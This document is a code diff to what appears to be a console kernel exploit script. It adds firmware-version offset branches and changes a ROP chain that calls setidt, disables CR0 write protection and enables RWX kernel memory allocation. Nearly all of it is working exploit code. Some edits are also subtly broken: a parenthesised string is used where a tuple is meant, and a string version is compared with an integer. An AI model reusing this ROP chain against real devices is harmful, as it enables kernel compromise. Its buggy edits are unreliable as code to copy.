@@ -228,7 +228,7 @@ class Exploit():
                 self.offs = OffsetsFirmware_800_803()
             elif self.sys_ver in ('850', '852'):
                 self.offs = OffsetsFirmware_850_852()
-            elif self.sys_ver == '900':
+            elif self.sys_ver in ('900'):
                 self.offs = OffsetsFirmware_900()
             elif self.sys_ver in ('903', '904'):
                 self.offs = OffsetsFirmware_903_904()
@@ -238,7 +238,7 @@ class Exploit():
                 self.offs = OffsetsFirmware_1000_1001()
             elif self.sys_ver in ('1050', '1070', '1071'):
                 self.offs = OffsetsFirmware_1050_1071()
-            elif self.sys_ver == '1100':
+            elif self.sys_ver in ('1100'):
                 self.offs = OffsetsFirmware_1100()
             else:
                 self.sys_ver = None
@@ -613,24 +613,28 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
 
-        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
-        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
-        rop += p64(IDT_UD)
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(SDT_SYSIGT)
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(SEL_KPL)
-        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
-        rop += p64(0)
-        rop += p64(0xDEADBEEF)
-        rop += p64(self.kdlsym(self.offs.SETIDT))
+        if (self.sys_ver >= 650):
+            # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
+            rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+            rop += p64(IDT_UD)
+            rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+            rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
+            rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+            rop += p64(SDT_SYSIGT)
+            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+            rop += p64(SEL_KPL)
+            rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+            rop += p64(0)
+            rop += p64(0xDEADBEEF)
+            rop += p64(self.kdlsym(self.offs.SETIDT))
 
         # Disable write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI & ~CR0_WP)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # Enable RWX in kmem_alloc
         rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
@@ -645,7 +649,10 @@ class Exploit():
         # Restore write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # kmem_alloc(*kernel_map, PAGE_SIZE)
 
